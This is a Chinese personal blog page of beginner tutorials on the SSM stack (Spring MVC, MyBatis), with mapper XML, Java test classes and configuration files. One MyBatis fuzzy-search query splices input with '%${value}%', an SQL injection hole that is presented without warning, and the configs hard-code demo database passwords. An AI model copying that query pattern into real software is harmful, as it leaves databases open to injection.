              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-25T08:15:41+08:00">
                2019-01-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>模仿网上的教程,使用ssm完成一个对用户进行增删改查的小demo</p>
</blockquote>
<hr>
<h3 id="使用Maven构建SSM项目"><a href="#使用Maven构建SSM项目" class="headerlink" title="使用Maven构建SSM项目"></a>使用Maven构建SSM项目</h3><pre><code>1.导入 jar 包(如果使用 maven 则配置 pom.xml)
2.配置 web.xml 文件
3.配置 spring.xml springMVC.xml myBatis.xml
4.配置资源文件，database.properties，log4j.properties 等等
5.设计 entity 实体类
6.编写 DAO 层接口和 Mapper.xml
7.编写 service 业务层
8.编写 cotroller 控制器
9.视图代码：前台 jsp 页面

1.在pom.xml项目中添加SSM项目需要的jar包    
2.配置Spring mvc的相关配置信息(自动扫描cn.test包下带有注解的类)            
3.通过xml方式配置日志与数据库
4.创建实体类User Dao类UserDao 业务类UserService
5.创建控制器UserController并返回数据到视图层`view/*.jsp`
</code></pre><p>测试界面:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-24.10.42.18-image.png" alt="2019-01-24.10.42.18-image.png"></p>
<p>项目结构:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-24.20.17.58-image.png" alt="2019-01-24.20.17.58-image.png"></p>
<h3 id="学生管理系统-SSM版"><a href="#学生管理系统-SSM版" class="headerlink" title="学生管理系统(SSM版)"></a>学生管理系统(SSM版)</h3><p>ssm框架基本结构图：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-25.22.17.27-image.png" alt="2019-01-25.22.17.27-image.png"></p>
<p>用户访问SSM流程图:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-25.21.00.51-image.png" alt="2019-01-25.21.00.51-image.png"></p>
<p><a href="https://github.com/P0rZ9/SSM" target="_blank" rel="noopener">源代码</a>    </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/23/Mybatis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/23/Mybatis/" itemprop="url">ssm基础之MyBatis</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-23T09:15:41+08:00">
                2019-01-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>学习了MYBATIS,记录一波    </p>
</blockquote>
<h3 id="Mybatis简介"><a href="#Mybatis简介" class="headerlink" title="Mybatis简介"></a>Mybatis简介</h3><blockquote>
<p>MyBatis 本是apache的一个开源项目iBatis, 2010年这个项目由apache software foundation 迁移到了google code，并且改名为MyBatis，是一个基于Java的持久层框架。</p>
</blockquote>
<p><strong>持久层</strong>： 可以将业务数据存储到磁盘，具备长期存储能力，只要磁盘不损坏，在断电或者其他情况下，重新开启系统仍然可以读取到这些数据。<br><strong>优点</strong>： 可以使用巨大的磁盘空间存储相当量的数据，并且很廉价<br><strong>缺点</strong>：慢（相对于内存而言）</p>
<p><strong>为什么使用Mybatis</strong>        </p>
<blockquote>
<p>传统JDBC中,除了自己提供sql语句外,还必须操作Connection,Statement,ResultSet,非常繁琐。使用Mybatis后,只需要提供sql语句即可,我们只需要重点关注增删改查这些操作层面上。并且Mybatis支持使用简单的XML或注解来配置和映射原生信息,将接口和Java对象映射为数据库中的记录。            </p>
</blockquote>
<p>Mybatis运行程序原理图:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-22.20.51.18-image.png" alt="2019-01-22.20.51.18-image.png"></p>
<pre><code>程序执行顺序:
1.应用程序找Mybatis要数据            
2.Mybatis从数据库找来数据        
    2.1 通过mybatis-config.xml定位数据库        
    2.2 通过User.xml执行对应的select语句        
    2.3 基于User.xml把返回的数据库记录封装在User对象中
    2.4 将多个User对象封装在一个User集合中        
3.返回一个User集合
</code></pre><h3 id="第一个Mybatis程序"><a href="#第一个Mybatis程序" class="headerlink" title="第一个Mybatis程序"></a>第一个Mybatis程序</h3><p>1.Maven pom.xml    </p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;mysql&lt;/groupId&gt;
    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
    &lt;version&gt;5.1.43&lt;/version&gt;
&lt;/dependency&gt;

&lt;!-- Mybatis依赖 --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;
    &lt;version&gt;3.4.4&lt;/version&gt;
&lt;/dependency&gt;
</code></pre><p>2.Mybatis 配置文件 mybatis-config.xml<br>作用主要就是提供连接数据库用的驱动,数据名称,编码方式,账号密码等</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE configuration
        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;
        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;

&lt;configuration&gt;


    &lt;typeAliases&gt;
        &lt;package name=&quot;com.test.pojo&quot;/&gt;
    &lt;/typeAliases&gt;

    &lt;environments default=&quot;development&quot;&gt;
        &lt;environment id=&quot;development&quot;&gt;
            &lt;transactionManager type=&quot;JDBC&quot;/&gt;
            &lt;dataSource type=&quot;POOLED&quot;&gt;
                &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;
                &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/mybatis?characterEncoding=UTF-8&quot;/&gt;
                &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;
                &lt;property name=&quot;password&quot; value=&quot;root&quot;/&gt;
            &lt;/dataSource&gt;
        &lt;/environment&gt;
    &lt;/environments&gt;
    &lt;mappers&gt;
        &lt;mapper resource=&quot;com/test/pojo/User.xml&quot;/&gt;
    &lt;/mappers&gt;

&lt;/configuration&gt;
</code></pre><p>3.配置文件User.xml</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE mapper
        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;
        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;

&lt;mapper namespace=&quot;com.test.pojo&quot;&gt;
    &lt;select id=&quot;listUser&quot; resultType=&quot;User&quot;&gt;
            select * from user
    &lt;/select&gt;

    &lt;insert id=&quot;addUser&quot; parameterType=&quot;User&quot;&gt;
        insert into user ( name ) values (#{name})
    &lt;/insert&gt;

    &lt;delete id=&quot;delUser&quot; parameterType=&quot;User&quot;&gt;
        delete from user where id = #{id}
    &lt;/delete&gt;

    &lt;select id=&quot;getUser&quot; parameterType=&quot;_int&quot; resultType=&quot;User&quot;&gt;
        select * from user where id=#{id}
    &lt;/select&gt;

    &lt;update id=&quot;updateUser&quot; parameterType=&quot;User&quot; &gt;
        update user set name = #{name} where id=#{id}
    &lt;/update&gt;

    &lt;!--模糊查询--&gt;
    &lt;select id=&quot;findUserByName&quot; parameterType=&quot;String&quot; resultType=&quot;User&quot;&gt;
        select * from user where name like &apos;%${value}%&apos;
    &lt;/select&gt;


&lt;/mapper&gt;
</code></pre><p>由于在主配置文件里配置了<code>&lt;typeAliases&gt;</code>别名,所以在这里的resultType可以直接写User,不用写全名pojo.User<br>namespace属性就是对SQL语句进行分类管理,实现不同业务的SQL隔离。            </p>
<p>4.测试类  TestMybatis.java    </p>
<pre><code>TestMybatis.java            
package com.test;

import java.io.IOException;
import java.io.InputStream;
import java.util.List;

import org.apache.ibatis.io.Resources;
import org.apache.ibatis.session.SqlSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.apache.ibatis.session.SqlSessionFactoryBuilder;

import com.test.pojo.User;

public class TestMybatis {

public static void main(String[] args) throws IOException {
    String resource = &quot;mybatis-config.xml&quot;;
    InputStream inputStream = Resources.getResourceAsStream(resource);
    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);
    SqlSession session=sqlSessionFactory.openSession();


    //插入用户
    User user1 = new User();
    user1.setName(&quot;test1&quot;);
    session.insert(&quot;addUser&quot;,user1);

   //修改用户
    User user2 = session.selectOne(&quot;getUser&quot;,5);
    user2.setName(&quot;test_after&quot;);
    session.update(&quot;updateUser&quot;,user2);

    //删除用户
    User user3 = new User();
    user3.setId(3);
    session.delete(&quot;delUser&quot;,user3);

    //获取用户
    User user4 = session.selectOne(&quot;getUser&quot;,5);
    System.out.println(user4.getName());

    //模糊查询
    List&lt;User&gt; users = session.selectList(&quot;findUserByName&quot;,&quot;te&quot;);
    for(User user : users){
        System.out.println(user.getId()+&quot;:&quot;+user.getName());
    }

    //获取全部用户
    listAll(session);
    session.commit();
    session.close();
}

private static void listAll(SqlSession session){

    //列出全部用户
    List&lt;User&gt; users=session.selectList(&quot;listUser&quot;);
    for (User user : users) {
        System.out.println(user.getName());
    }
}
}
</code></pre><p>xml文件几个概念:<br>parameterType：指定输入参数类型,可为基本数据类型(int float)与包装数据类型(String Interger)以及用户编写的JavaBean类<br>resultType: 指定从数据库返回的信息对应的Java数据类型。</p>
<p>#{}： 占位符,该符号接收输入参数,花括号中编写参数名称来接收对应参数。当#{}接收简单类型时可用value或者其他名称来获取。<br>${}：表示拼接符,可在原有SQL语句上拼接新的符合SQL语法的语句。            </p>
<p>MyBatis使用场景:通过上面的入门程序,MyBatis的特点就是以Sql语句为核心的不完全的ORM(关系型映射)框架。使用场景为:对SQL语句优化要求比较高,项目需求经常变动。            </p>
<h3 id="MyBatis深入学习"><a href="#MyBatis深入学习" class="headerlink" title="MyBatis深入学习"></a>MyBatis深入学习</h3><h4 id="编写日志输出环境配置文件"><a href="#编写日志输出环境配置文件" class="headerlink" title="编写日志输出环境配置文件"></a>编写日志输出环境配置文件</h4><h4 id="MyBatis高级映射"><a href="#MyBatis高级映射" class="headerlink" title="MyBatis高级映射"></a>MyBatis高级映射</h4><h5 id="一对一查询"><a href="#一对一查询" class="headerlink" title="一对一查询"></a>一对一查询</h5><p>查询number对应的学生姓名。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-22.23.40.15-image.png" alt="2019-01-22.23.40.15-image.png"></p>
<h6 id="使用resultType-只能映射到一个确定的Java包装类"><a href="#使用resultType-只能映射到一个确定的Java包装类" class="headerlink" title="使用resultType    (只能映射到一个确定的Java包装类)"></a>使用resultType    (只能映射到一个确定的Java包装类)</h6><p>1.首先更改主配置文件加载的<mappers>的内容:    </mappers></p>
<pre><code>  &lt;mappers&gt;
    &lt;mapper resource=&quot;com/test/pojo/Student.xml&quot;/&gt;
&lt;/mappers&gt;
</code></pre><p>2.Student.xml            </p>
<pre><code>&lt;select id=&quot;findStudentByCard&quot; parameterType=&quot;_int&quot; resultType=&quot;Student&quot;&gt;
  SELECT
    student.*,
    card.*
  FROM
    student,card
  WHERE student.card_id = card.id AND card.number = #{value}
&lt;/select&gt;
</code></pre><h6 id="使用-resultMap-实现"><a href="#使用-resultMap-实现" class="headerlink" title="使用 resultMap 实现"></a>使用 resultMap 实现</h6><p>使用resultMap可以将数据字段映射到名称不一样的响应实体类属性中,重要的是可映射到实体类包裹的其他实体类。<br>1.首先更改主配置文件加载的<mappers>的内容:    </mappers></p>
<pre><code>  &lt;mappers&gt;
    &lt;mapper resource=&quot;com/test/pojo/Student.xml&quot;/&gt;
&lt;/mappers&gt;
</code></pre><p>2.创建一个新的实体类(包含Student与card)<br>StudentWithCard.java </p>
<pre><code>package com.test.pojo;
  public class StudentWithCard {
    Student student;
    int number;
    int id;

      //geter and seter
  }
</code></pre><p>3.Student.xml</p>
<pre><code>&lt;mapper namespace=&quot;com.test.pojo&quot;&gt;
&lt;select id=&quot;findStudentByCard&quot; parameterType=&quot;_int&quot; resultMap=&quot;StudentInfoMap&quot;&gt;
  SELECT
    student.*,
    card.*
  FROM
    student,card
  WHERE student.card_id = card.id AND card.number = #{value}
&lt;/select&gt;

&lt;resultMap id=&quot;StudentInfoMap&quot; type=&quot;StudentWithCard&quot;&gt;
&lt;!-- id 标签表示对应的主键
     column 对应查询结果的列值
     property 对应封装类中的属性名称
--&gt;
      &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt;
      &lt;result column=&quot;number&quot; property=&quot;number&quot;/&gt;
      &lt;!-- association 表示关联的嵌套结果，
           可以简单理解就是为封装类指定的标签
           --&gt;
      &lt;association property=&quot;student&quot; javaType=&quot;Student&quot;&gt;
        &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt;
        &lt;result column=&quot;name&quot; property=&quot;name&quot;/&gt;
        &lt;result column=&quot;card_id&quot; property=&quot;card_id&quot;/&gt;
      &lt;/association&gt;
&lt;/resultMap&gt;
&lt;/mapper&gt;
</code></pre><p>4.测试类(取出number为1111的学生的信息):</p>
<pre><code>StudentWithCard student = session.selectOne(&quot;findStudentByCard&quot;,1111);
System.out.println(student.getStudent().getName());
</code></pre><p>  <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-23.11.35.57-image.png" alt="2019-01-23.11.35.57-image.png"></p>
<h5 id="一对多查询"><a href="#一对多查询" class="headerlink" title="一对多查询"></a>一对多查询</h5><p>查询选修了同一个班级的同学信息<br>  <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-23.11.42.33-image.png" alt="2019-01-23.11.42.33-image.png"><br>1.首先更改主配置文件加载的<mappers>的内容:    </mappers></p>
<pre><code>&lt;mappers&gt;
  &lt;mapper resource=&quot;com/test/pojo/Class.xml&quot;/&gt;
&lt;/mappers&gt;
</code></pre><p>2.创建class实体类    </p>
<pre><code>package com.test.pojo;
import java.util.List;
public class Class {
    private int id;
    private String name;
    private List&lt;Student&gt; students;
      //geter and seter
  }
</code></pre><p>3.映射文件Class.xml            </p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE mapper
        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;
        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;

&lt;mapper namespace=&quot;com.test.pojo&quot;&gt;

    &lt;resultMap id=&quot;Students&quot; type=&quot;Student&quot;&gt;
        &lt;id column=&quot;student_id&quot; property=&quot;student_id&quot; /&gt;
        &lt;result column=&quot;name&quot; property=&quot;name&quot; /&gt;
    &lt;/resultMap&gt;

    &lt;select id=&quot;listStudentByClassName&quot; parameterType=&quot;String&quot; resultMap=&quot;Students&quot;&gt;
        select student.* from student, class where student.student_id = class.student_id and class.name = #{value}
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre><p>子元素说明:<br>  id: 设置主键字段与模型属性的映射关系<br>  result: 设置普通字段与模型属性的关系            </p>
<p>配置属性:<br>  property: 映射到JavaBean的属性名称<br>  column: 数据表的列名或者标签别名<br>  javaType: 一个完整的类名,匹配的是一个JavaBean,MyBatis会自动检测</p>
<p>4.测试类(输出课程为Java课的学生信息):</p>
<pre><code>List&lt;Student&gt; students = session.selectList(&quot;listStudentByClassName&quot;,&quot;Java课&quot;);
for (Student student : students){
    System.out.println(&quot;ID:&quot;+student.getStudent_id()+&quot;,NAME:&quot;+student.getName());
}  
</code></pre><p>  <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-23.12.28.48-image.png" alt="2019-01-23.12.28.48-image.png"></p>
<p>结合sql语句与映射文件,就可以很方便的操作数据库        </p>
<h3 id="Mapper-代理实例编写"><a href="#Mapper-代理实例编写" class="headerlink" title="Mapper 代理实例编写"></a>Mapper 代理实例编写</h3><p>1.Mybatis-config.xml        </p>
<pre><code>&lt;mappers&gt;
    &lt;mapper resource=&quot;com/test/pojo/StudentMapper.xml&quot;/&gt;
&lt;/mappers&gt;
</code></pre><p>2.StudentMapper.xml        </p>
<pre><code>  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE mapper
        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;
        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;

&lt;mapper namespace=&quot;com.test.pojo.mapper.StudentMapper&quot;&gt;
    &lt;!-- 查询学生 --&gt;
    &lt;select id=&quot;findStudentById&quot; parameterType=&quot;_int&quot; resultType=&quot;com.test.pojo.Student&quot;&gt;
        SELECT * FROM student WHERE student_id = #{id}
    &lt;/select&gt;
    &lt;!-- 增加用户 --&gt;
    &lt;insert id=&quot;insertStudent&quot; parameterType=&quot;com.test.pojo.Student&quot;&gt;
        INSERT INTO student(student_id, name) VALUES(#{id}, #{name})
    &lt;/insert&gt;
    &lt;!-- 删除用户 --&gt;
    &lt;delete id=&quot;deleteStudent&quot; parameterType=&quot;_int&quot;&gt;
        DELETE FROM student WHERE student_id = #{id}
    &lt;/delete&gt;
    &lt;!-- 修改用户 --&gt;
    &lt;update id=&quot;updateStudent&quot; parameterType=&quot;com.test.pojo.Student&quot;&gt;
        UPDATE student SET name = #{name} WHERE student_id = #{id}
    &lt;/update&gt;
&lt;/mapper&gt;
</code></pre><p>如果需要使用StudentMapper.xml的Mapper代理,需要先定义一个接口,名为StudentMapper,然后新建方法定义,分别对应配置文件的增删改查配置,然后将StudentMapper中的namespace改为接口定义的地方,即可在业务类中使用Mapper代理。<br>3.StudentMapper.java接口类(pojo/mapper/StudentMapper.java)    </p>
<pre><code>package com.test.pojo.mapper;
import com.test.pojo.Student;
public interface StudentMapper {

    // 根据 id 查询学生信息
    public Student findStudentById(int id) throws Exception;

    // 添加学生信息
    public void insertStudent(Student student) throws Exception;

    // 删除学生信息
    public void deleteStudent(int id) throws Exception;

    // 修改学生信息
    public void updateStudent(Student student) throws Exception;
}
</code></pre><p>4.测试类Test.java            </p>
<pre><code>  package com.test;

import java.io.InputStream;
import com.test.pojo.Student;
import com.test.pojo.mapper.StudentMapper;
import org.apache.ibatis.io.Resources;
import org.apache.ibatis.session.SqlSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.apache.ibatis.session.SqlSessionFactoryBuilder;



public class Test {

    public static void main(String[] args) throws Exception {
        String resource = &quot;mybatis-config.xml&quot;;
        InputStream inputStream = Resources.getResourceAsStream(resource);
        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);
        SqlSession session=sqlSessionFactory.openSession();

        // 获取Mapper代理
        StudentMapper studentMapper = session.getMapper(StudentMapper.class);


        //执行 Mapper 代理独享的查询方法
        Student student = studentMapper.findStudentById(1);
        System.out.println(student.getName());

        //insertStudent
        Student student1 = new Student();
        student1.setName(&quot;test_1&quot;);
        student1.setStudent_id(3);
        studentMapper.insertStudent(student1);

        //deleteStudent
        studentMapper.deleteStudent(3);

        //updateStudent
        Student student2 = new Student();
        student2.setStudent_id(2);
        student2.setName(&quot;student_2&quot;);
        studentMapper.updateStudent(student2);

        session.close();
    }}
</code></pre><h3 id="注解开发MyBatis"><a href="#注解开发MyBatis" class="headerlink" title="注解开发MyBatis"></a>注解开发MyBatis</h3><p>依照刚才Mapper的例子:<br>1.我们将StudentMapper.xml的配置的sql语句用注释配置在StudentMapper接口中:</p>
<pre><code>  public interface StudentMapper {

    // 根据 id 查询学生信息
    @Select(&quot;SELECT * FROM student WHERE student_id = #{id}&quot;)
    public Student findStudentById(int id) throws Exception;

    // 添加学生信息
    @Insert(&quot;INSERT INTO student(student_id, name) VALUES(#{id}, #{name})&quot;)
    public void insertStudent(Student student) throws Exception;

    // 删除学生信息
    @Delete(&quot;DELETE FROM student WHERE student_id = #{id}&quot;)
    public void deleteStudent(int id) throws Exception;

    // 修改学生信息
    @Update(&quot;UPDATE student SET name = #{name} WHERE student_id = #{id}&quot;)
    public void updateStudent(Student student) throws Exception;
}
</code></pre><p>2.修改mybatis-config.xml(将之前配置的映射注释掉)</p>
<pre><code>&lt;!-- 映射文件 --&gt;
&lt;mappers&gt;
    &lt;!--&lt;mapper resource=&quot;com/test/pojo/StudentMapper.xml&quot;/&gt;--&gt;
    &lt;mapper class=&quot;com.test.pojo.mapper.StudentMapper&quot;/&gt;
&lt;/mappers&gt;
</code></pre><p>3.测试类代码不变,即可运行程序            </p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.jianshu.com/p/c77e3691867d" target="_blank" rel="noopener">https://www.jianshu.com/p/c77e3691867d</a><br><a href="http://how2j.cn/k/mybatis/mybatis-tutorial/1087.html" target="_blank" rel="noopener">http://how2j.cn/k/mybatis/mybatis-tutorial/1087.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/23/Spring_mvc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/23/Spring_mvc/" itemprop="url">ssm基础之Spring MVC</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-23T08:15:41+08:00">
                2019-01-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>跟着大佬的几篇文章学习了SpringMVC,记录一下。</p>
</blockquote>
<p>SpringMVC:<br>springmvc是一个基于mvc的web框架。</p>
<h4 id="Spring-MVC基本配置"><a href="#Spring-MVC基本配置" class="headerlink" title="Spring MVC基本配置"></a>Spring MVC基本配置</h4><p>1.在web.xml配置入口Servlet    </p>
<pre><code>&lt;servlet&gt;
    &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt; 
    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;
    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
  &lt;/servlet&gt;

  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;    
</code></pre><p>Servlet名字为:mvc-dispatcher   uri-pattern为/:拦截所有请求<br>2.SpringMVC的映射配置文件<br>在<code>mvc-dispatcher-servlet.xml</code>,配置SpringMVC的一些Controller的初始化,静态文件的映射策略,视图的配置等,这里只说下视图解析器的相关配置:        </p>
<pre><code>&lt;!--ViewResolver 视图解析器--&gt;
&lt;!--用于支持Servlet、JSP视图解析--&gt;
&lt;bean id=&quot;jspViewResolver&quot; class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;
    &lt;property name=&quot;viewClass&quot; value=&quot;org.springframework.web.servlet.view.JstlView&quot;/&gt;
    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/pages/&quot;/&gt;
    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;
&lt;/bean&gt;
</code></pre><p>在SpringMVC中,controller会返回一个字符串(jsp名字)。在jspViewResolver的2个属性分别为jsp文件的前缀(/WEB-INF/pages/)与后缀(.jsp),这样在controller里面,如果返回的字符串是index(<code>return &quot;index&quot;</code>),SpringMVC就会找到<code>/WEB-INF/pages/index.jsp</code>文件    </p>
<p>3.Maven自动导入jar包<br> 既然我们做SpringMVC开发,肯定少不了相关的jar包,但是随着项目增大,原来那种下载包然后导入感觉太麻烦,现在使用Maven就变得简单了。    其实maven的工作原理简单理解就是自动将你需要的jar包下载到本地,然后关联到项目中,所有的包都存储在几个中央仓库里面,需要什么包,就取出什么包<br> pom.xml<br> 重点看<code>&lt;dependencies&gt;</code>标签，将对每个包的需求都看成一个依赖<code>&lt;depedency&gt;</code>,定义在<code>&lt;dependencies&gt;</code>中,在每个<code>&lt;dependencies&gt;</code>中,需要提供jar包的groupid,artifactId和version,我们引入一个junit包的格式:</p>
<pre><code>  &lt;dependency&gt;
    &lt;groupId&gt;junit&lt;/groupId&gt;
    &lt;artifactId&gt;junit&lt;/artifactId&gt;
    &lt;version&gt;3.8.1&lt;/version&gt;
    &lt;scope&gt;test&lt;/scope&gt;
&lt;/dependency&gt;
</code></pre><p>要引入其他包,查询:<a href="https://mvnrepository.com/" target="_blank" rel="noopener">https://mvnrepository.com/</a><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-15.21.52.56-image.png" alt="2019-01-15.21.52.56-image.png"><br> 在pom.xml中填写<code>&lt;dependencies&gt;</code>标签的内容即可</p>
<p>4.数据库配置<br>SpringMVC集成Spring Data JPA（由 Hibernate JPA 提供），来进行强大的数据库访问<br>在之前接触MVC模式中,数据库的一张表往往对应着一个JavaBean,在SpringMVC中,这个JavaBean就相当于model,且Idea会自动帮我们生成这些类<br>配置数据库有2种方法,由于刚开始学习,先使用较简单的,直接在<code>mvc-dispatcher-servlet.xml</code>中配置:    </p>
<pre><code>&lt;bean id=&quot;entityManagerFactory&quot; class=&quot;org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean&quot;&gt;
        &lt;property name=&quot;persistenceUnitName&quot; value=&quot;defaultPersistenceUnit&quot;/&gt;
        &lt;property name=&quot;packagesToScan&quot; value=&quot;com.gaussic.model&quot; /&gt;
        &lt;property name=&quot;jpaVendorAdapter&quot;&gt;
            &lt;bean class=&quot;org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter&quot;/&gt;
        &lt;/property&gt;
        &lt;property name=&quot;jpaProperties&quot;&gt;
            &lt;props&gt;
                &lt;prop key=&quot;hibernate.connection.driver_class&quot;&gt;com.mysql.jdbc.Driver&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.connection.url&quot;&gt;jdbc:mysql://localhost:3306/springdemo?useSSL=false&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.connection.username&quot;&gt;root&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.connection.password&quot;&gt;111111&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.show_sql&quot;&gt;false&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.connection.useUnicode&quot;&gt;true&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.connection.characterEncoding&quot;&gt;UTF-8&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.format_sql&quot;&gt;true&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.use_sql_comments&quot;&gt;true&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.hbm2ddl.auto&quot;&gt;update&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.connection.autoReconnect&quot;&gt;true&lt;/prop&gt;
                &lt;prop key=&quot;hibernate.dialect&quot;&gt;org.hibernate.dialect.MySQL5Dialect&lt;/prop&gt;
            &lt;prop key=&quot;connection.autoReconnectForPools&quot;&gt;true&lt;/prop&gt;
            &lt;prop key=&quot;connection.is-connection-validation-required&quot;&gt;true&lt;/prop&gt;

            &lt;prop key=&quot;hibernate.c3p0.validate&quot;&gt;true&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.connection.provider_class&quot;&gt;org.hibernate.service.jdbc.connections.internal.C3P0ConnectionProvider&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.min_size&quot;&gt;5&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.max_size&quot;&gt;600&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.timeout&quot;&gt;1800&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.max_statements&quot;&gt;50&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.preferredTestQuery&quot;&gt;SELECT 1;&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.testConnectionOnCheckout&quot;&gt;true&lt;/prop&gt;
            &lt;prop key=&quot;hibernate.c3p0.idle_test_period&quot;&gt;3000&lt;/prop&gt;
        &lt;/props&gt;
    &lt;/property&gt;
&lt;/bean&gt;
